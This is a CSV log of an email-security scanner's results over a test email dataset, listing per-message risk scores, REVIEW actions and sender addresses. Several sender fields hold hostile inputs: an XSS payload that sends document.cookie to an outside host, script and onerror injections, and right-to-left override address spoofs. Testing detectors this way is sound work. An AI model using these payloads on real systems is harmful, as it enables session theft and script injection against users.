filename,status,ground_truth,risk_score,severity,recommended_action,anomaly_score,detection_score,attribution_country,attribution_confidence,campaign_id,healing_applied,from_addr,spf,dkim,dmarc,elapsed_ms,explanation,error,timestamp,file
09787172228a465762651418bc948f4f.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.3,,False,"christi.smith@lrinet.com, fispghofsti@australiamail.com",,,,319.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.621295,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\09787172228a465762651418bc948f4f.eml
0987aaf669cab02b9e43aa4cd1c5f858.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,18.4,,False,admin@security.carlsoncapital.com,,,,321.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.625965,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\0987aaf669cab02b9e43aa4cd1c5f858.eml
8d3c00c15df141371c21cb5425d2488f.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.1,,True,"""\\u202hcael.guod@\\u202moc.norne""",,,,325.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.627256,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8d3c00c15df141371c21cb5425d2488f.eml
8d3b1639a3058458b7e626197127333b.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,"""b64 b64""@attack.com",,,,338.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.623938,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8d3b1639a3058458b7e626197127333b.eml
3c33eafb748b4285d79987143f5fdd47.eml,ERROR,,,,,,,,,,,,,,,345.0,,HTTP_500,2026-09-22T11:31:22.622386,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c33eafb748b4285d79987143f5fdd47.eml
641f3024f5cf34e22003d92466d00b49.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Paolo <crowd@glay.org>,,,,347.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.623288,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\641f3024f5cf34e22003d92466d00b49.eml
b4c1864c98ddd8efd52bfc589626dd2d.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.3,,False,energyseminars@energyseminars.com,,,,350.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.624611,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b4c1864c98ddd8efd52bfc589626dd2d.eml
6422c5527b791f38651dfe9772d12ef0.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-4C77DB23,False,"""test<svg onload='img=new Image();img.src=//x55.me/geo.php?get=+document.cookie;'>@attack.com""",,,,352.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.626835,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\6422c5527b791f38651dfe9772d12ef0.eml
dc0d11a34ebbc69d2446ff4848acb6d5.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.4,,False,"""sales@webdesin.com"" <>, test@attack.com",,,,357.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.625428,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc0d11a34ebbc69d2446ff4848acb6d5.eml
3c37b1d6a88d404afd2f18ac4ac60cc5.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.3,,False,travel_html@lists.smartmoney.com,,,,362.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.626407,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c37b1d6a88d404afd2f18ac4ac60cc5.eml
dc0f794a11cd140f62c7cd04c6ef2a96.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Fjburkowski <watkinsgr1@hotmail.com>,,,,46.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.947793,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc0f794a11cd140f62c7cd04c6ef2a96.eml
0988420850e82a82499afd9ac531c6c2.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.4,CAMP-601CF191,False,test@attack.com,,,,45.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.952600,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\0988420850e82a82499afd9ac531c6c2.eml
642565ccf37efa56230e9359171083b3.eml,ERROR,,,,,,,,,,,,,,,32.9,,HTTP_500,2026-09-22T11:31:22.967473,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\642565ccf37efa56230e9359171083b3.eml
b4cf501eef8dc073cc2d793f86293571.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.4,,False,"""ddoyle@nyiso.com""",,,,30.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.975680,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b4cf501eef8dc073cc2d793f86293571.eml
8d3db2b999959632f7aca798baa50bf9.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,14.3,,False,Sadie Spivey <cementonran@cmaust.net.au>,,,,39.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.971046,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8d3db2b999959632f7aca798baa50bf9.eml
dc1468afbda63fc84da6609e5cbaccde.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,15.1,CAMP-502A87BF,False,van.ngo@test.enron.com,,,,34.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.979389,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc1468afbda63fc84da6609e5cbaccde.eml
b4ca6e79f5d111af07982698372c17b0.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.3,,False,jeffrey.jakubiak@troutmansanders.com,,,,78.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.940595,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b4ca6e79f5d111af07982698372c17b0.eml
098b2229a759a9c5c3030abf4d2129e8.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.4,,False,414371.167547968.1@news.forbesdigital.com,,,,41.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.983090,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\098b2229a759a9c5c3030abf4d2129e8.eml
3c3c1316f8caebe7c0bd369dcf7978c4.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,14.3,,False,"""test<img onerror=window.location.href=http""",,,,66.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.962544,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c3c1316f8caebe7c0bd369dcf7978c4.eml
642778e81f92240db5c554633dd7be0e.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,22.1,,False,corrier@cox-internet.com,,,,39.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.994038,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\642778e81f92240db5c554633dd7be0e.eml
8d431ed545af68d2a4360f5a6c0ae7af.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-65449F98,False,vwbjjubrg3@hotmail.com,,,,37.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.998339,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8d431ed545af68d2a4360f5a6c0ae7af.eml
b4e4e776d1f38a9abc933e87e49f596a.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Gretchen FELTNER <ventralpsychedelics@bac.burda.com>,,,,38.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.000525,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b4e4e776d1f38a9abc933e87e49f596a.eml
098bbdff8133983aede2ebf99fe9ee09.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-2D8B7D8D,False,Russell Turpin <deafbox@hotmail.com>,,,,36.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.010043,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\098bbdff8133983aede2ebf99fe9ee09.eml
dc24d8562b6fefb502c218941101aeb1.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,postmaster@deloitte.com,,,,43.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.005969,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc24d8562b6fefb502c218941101aeb1.eml
3c46ca54828cf5df0256c9eba0353b34.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-DB76422B,False,"""test<img src=null [263]onerror=alert />@attack.com""",,,,38.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.013414,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c46ca54828cf5df0256c9eba0353b34.eml
642e797a0d636e00c95c4214320d79cf.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Mitchell Reilly <j.j.young@0800dial.com>,,,,36.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.018970,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\642e797a0d636e00c95c4214320d79cf.eml
8d4973e87391d5ee362df533a6b9b469.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,patti.ucci@enron.com,,,,34.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.024543,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8d4973e87391d5ee362df533a6b9b469.eml
3c40ee70305bc13f06529b9a6dd56a37.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.4,,False,"<>, JeaninefRead@computerbusters.net",,,,76.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:22.988522,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c40ee70305bc13f06529b9a6dd56a37.eml
dc2deb02abbf2f26198a49a3e6a94700.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Garrett Hayes <burywithus.com@lotto-otto.com>,,,,35.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.033187,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc2deb02abbf2f26198a49a3e6a94700.eml
098f4b017347daec7369f8c06c4037f8.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,padi@mail2.padi.com,,,,36.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.035572,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\098f4b017347daec7369f8c06c4037f8.eml
3c48119836e0198a169e289ebf30d9df.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.8,CAMP-79F0CCD9,False,c..james@enron.com,,,,39.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.038931,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c48119836e0198a169e289ebf30d9df.eml
8d55c5805826ecc0f072a3cb9c121100.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,darrell@sbsc.org,,,,34.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.049238,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8d55c5805826ecc0f072a3cb9c121100.eml
6431405717095284ebe49b92b5470a63.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,16.7,CAMP-F84093C3,False,kristin.harrelson@enron.com,,,,46.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.046203,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\6431405717095284ebe49b92b5470a63.eml
b509f03bf7426d20da5a0f859ea82590.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,nkaraca@donwat.com,,,,44.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.051977,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b509f03bf7426d20da5a0f859ea82590.eml
dc3459aabc503e8f88bcb343125e29c4.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.4,CAMP-98C60BC0,False,jean.mrha@enron.com,,,,45.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.055313,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc3459aabc503e8f88bcb343125e29c4.eml
099da2b8cb333e2d5ac5bfb8cd3022c4.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.0,CAMP-FE4DA9DF,False,brian.wood@enron.com attack.com,,,,48.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.058851,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\099da2b8cb333e2d5ac5bfb8cd3022c4.eml
b4ee8485dc256c4fd6442affc7b3870a.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.4,,False,rob.gennarini@conectiv.com,,,,84.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.028688,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b4ee8485dc256c4fd6442affc7b3870a.eml
643da8e1add66aee670945dad9644a56.eml,OK,,37.0,MEDIUM,REVIEW,0.1,55,,22.9,CAMP-7B77EBAF,False,"""\\u202omarbac@\\u202moc.nsm""",,,,49.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.068590,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\643da8e1add66aee670945dad9644a56.eml
8d66d0a3381aac9c83fe227f150fcc1d.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.1,CAMP-EB4F2ABC,False,"""diane.salcido@enron.com""",,,,54.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.072111,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8d66d0a3381aac9c83fe227f150fcc1d.eml
b50d590535a7d43ac0433390a75f224f.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Laverne Funk <mmwavem@mmwave.com>,,,,52.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.078033,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b50d590535a7d43ac0433390a75f224f.eml
099f94d0abd3f84266b4a634375f4531.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.1,,False,Carlo Rowe <scramblesintractability@nospammail.net>,,,,40.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.092888,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\099f94d0abd3f84266b4a634375f4531.eml
dc535bdd4ffa77ebebc540cf4938c04e.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-22483BFF,False,"""chris.benham@enron.com""",,,,54.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.084018,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc535bdd4ffa77ebebc540cf4938c04e.eml
3c67dcb236868c6f79135f54c4234bd1.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-2FE80D18,False,emilio.vicens@enron.com,,,,45.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.095984,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c67dcb236868c6f79135f54c4234bd1.eml
645708981e4a3a7f37f8f6a25fcbad60.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.4,CAMP-6C477F9F,False,"""b64 b64""@attack.com",,,,46.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.100564,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\645708981e4a3a7f37f8f6a25fcbad60.eml
8d689f889ab30bd8af5362b960c94e92.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.8,CAMP-A7CCDCFA,False,test@attack.com,,,,45.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.107023,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8d689f889ab30bd8af5362b960c94e92.eml
3c5274f40fe9c2cbca1ab176280c40fe.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,14.3,,False,Wilmer Lam <jahlin@brunet.bn>,,,,90.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.064773,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c5274f40fe9c2cbca1ab176280c40fe.eml
dc54bda08bb6aeed3b0873a3b7aa8574.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,14.3,,False,"""test<input id='ttt' value=javascript""",,,,39.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.118293,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc54bda08bb6aeed3b0873a3b7aa8574.eml
09b50a9bb7b65a0cb4f703153f87e18f.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-E9FE8139,False,"""test</script><script>alert()</script>@attack.com""",,,,35.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.126167,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\09b50a9bb7b65a0cb4f703153f87e18f.eml
3c6bec14f212df912c2d251459733294.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-5B5D2C9D,False,"w..pereira@enron.com, balking@aaron-clarke.com",,,,40.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.130280,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c6bec14f212df912c2d251459733294.eml
